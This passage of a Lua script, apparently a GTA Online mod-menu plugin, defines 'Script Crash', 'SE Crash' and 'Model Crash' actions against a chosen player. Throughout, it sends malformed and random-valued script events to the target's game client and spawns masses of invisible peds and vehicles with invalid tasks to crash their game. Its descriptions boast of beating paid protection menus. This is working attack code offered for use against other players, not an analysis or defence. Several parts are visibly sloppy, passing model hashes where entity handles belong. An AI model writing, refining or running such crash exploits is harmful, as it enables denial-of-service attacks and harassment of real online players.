            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
        end
    end)

    menu.action(scrashes, "Script crash 12", {"scrashv13"}, "", function()
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 17302, 9822, 1999, 6777888, 111222})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 27983, 7601, 1020, 3209051, 111222})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 1010, 0, 0, 0, -2653, 50555})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 1111, 0, 0, 0, -5621, 57766})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, -152, -123, -978, 0, 0, 1, 0, -167, -144})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 152, 123, 978, 0, 0, 1, 0, 167, 144})
        util.trigger_script_event(1 << player_id, {1249026189, 0, 0, 97587, 5697, 3211, 8237539, 967853})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 1967})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, -123, -957, -14, -1908, -123})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 12121, 9756, 7609, 1111111, 789666})
        util.trigger_script_event(1 << player_id, {315658550, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << player_id, {-877212109, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << player_id, {1926582096, 0, -1, -1, -1, 18899, 1011, 3070})
        util.trigger_script_event(1 << player_id, {1926582096, 0, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {1033875141, -17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 93})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 37, 0, -7})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -13, 0, 0, 0, 23})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 7, 7, 19, 0, 0, 1, 0, -23, -27})
        util.trigger_script_event(1 << player_id, {1249026189})
        util.trigger_script_event(1 << player_id, {315658550})
        util.trigger_script_event(1 << player_id, {-877212109})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 82})
        util.trigger_script_event(1 << player_id, {1926582096})
        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 3333, 0, 0, 0, -987, 21369})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2222, 0, 0, 0, -109, 73322})
        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.trigger_script_event(1 << player_id, {-1730227041, -494, 1526, 60541, -12988, -99097, -32105})
    end)

    menu.action(scrashes,"Script Crash V13", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
        util.trigger_script_event(1 << player_id,{526822748,player_id, 0, 2, 18969111})
        util.trigger_script_event(1 << player_id,{-555356783,player_id, 0, 2, 18969111})
        util.trigger_script_event(1 << player_id,{-1390976345,player_id, 0, 2, 18969111})
        util.trigger_script_event(1 << player_id,{-637352381,player_id, 0, 2, 18969111})
        util.trigger_script_event(1 << player_id,{-1529596656,player_id, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << player_id,{-1991423686,player_id, 0, 2, 18969111})
        util.trigger_script_event(1 << player_id,{1992522613,player_id, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << player_id,{-714268990,player_id, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << player_id,{495813132,player_id, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
        util.trigger_script_event(1 << player_id,{-1247985006,player_id, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
        util.trigger_script_event(1 << player_id,{526822748,player_id, 0, 2, 18969111})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, -17898883})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 17398799})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 15576064})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, -13128205})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, -10321649})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 9846577})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 15098687})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 15098687})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 21062401})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, -5065659})
        util.trigger_script_event(1 << player_id,{1348481963,player_id,  0, 2, 378775})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 9497036})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, 8067058})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, -3322411})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, -17851944})
        util.trigger_script_event(1 << player_id,{1348481963,player_id, 0, 2, -18386240})
        util.trigger_script_event(1 << player_id,{-634789188,player_id, 0, 2, -634789188})
        util.trigger_script_event(1 << player_id,{-634789188,player_id, 0, 2, -634789188})
        util.trigger_script_event(1 << player_id,{-668341698,player_id, 0, 2, -668341698})
        util.trigger_script_event(1 << player_id, {1214823473, player_id, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {2130458390, player_id, 0, 1, 0, 0, 0})
    end)

    menu.action(scrashes, "Script Crash V14", {}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    local secrashes = menu.list(scrashes, "SE Crashes", {}, "More Script Crashes")

    menu.action(secrashes, "SE Crash (S0)", {"secrashv1"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
            end
        util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
    end)

    menu.action(secrashes, "SE Crash (S1)", {"secrashv2"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(secrashes, "SE Crash (S2)", {"secrashv3"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            end
        util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)

    menu.action(secrashes, "SE Crash (S3)", {"secrashv4"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
            end
        util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
    end)

    menu.action(secrashes, "SE Crash (S4)", {"secrashv5"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
                end
        util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
    end)

    menu.action(secrashes, "SE Crash (S7)", {"secrashv7"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
            end
        util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
    end)

    local mcrashes = menu.list(crashes, "Model Crashes", {}, "Will work for some of the menus including paid ones.")

    local krustykrab = menu.list(mcrashes, "Crusty Crab", {}, "")

    local peds = 5
    menu.slider(krustykrab, "Number of spatulas", {}, "Send them some spatulas", 1, 45, 1, 1, function(amount)
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "Number of spatulas", {}, "Becarefull if you spectate", function(val)
        local crash_toggle = val
        BlockSyncs(player_id, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = players.get_position(player_id)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(player_id))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)

    menu.action(mcrashes, "Powerfull Invalid Model", {"mcrashv1"}, "Skid from x-force (Big CHUNGUS) \n Execute only 1 time!!", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = players.get_position(player_id)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)

    menu.toggle(mcrashes, "Super Op Crash", {}, "May crash ur game", function(on_toggle)
        util.toast("We are going to try our best to not crash ur game.")
        util.yield(2000)
        menu.trigger_commands("anticrashcamera On")
        menu.trigger_commands("potatomode On")
        menu.trigger_commands("nosky On")
        util.yield(100)
        menu.trigger_commands("reducedcollision On")
        menu.trigger_commands("levitate On")
        menu.trigger_commands("nocollision On")
        util.yield(500)
        menu.collect_garbage()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = players.get_position(player_id)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        if on_toggle then
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
